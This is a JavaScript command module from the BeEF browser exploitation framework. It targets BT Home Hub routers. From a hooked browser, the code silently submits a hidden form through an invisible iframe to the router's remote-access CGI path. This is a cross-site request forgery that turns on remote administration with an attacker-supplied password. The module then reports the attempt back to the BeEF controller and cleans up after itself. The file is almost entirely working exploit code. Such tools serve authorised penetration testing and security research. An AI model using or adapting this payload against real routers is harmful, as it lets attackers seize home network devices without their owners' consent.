//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var bt_home_hub_iframe = beef.dom.createInvisibleIframe();

  var form = document.createElement('form');
  form.setAttribute('action', gateway + "/cgi/b/ras//?ce=1&be=1&l0=5&l1=5");
  form.setAttribute('method', 'post');

  var input = null;

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', '0');
  input.setAttribute('value', '31');
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', '1');
  input.setAttribute('value', '');
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', '30');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  bt_home_hub_iframe.contentWindow.document.body.appendChild(form);
  form.submit();

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    delete form;
    document.body.removeChild(bt_home_hub_iframe);
  }
  setTimeout("cleanup()", 15000);

});

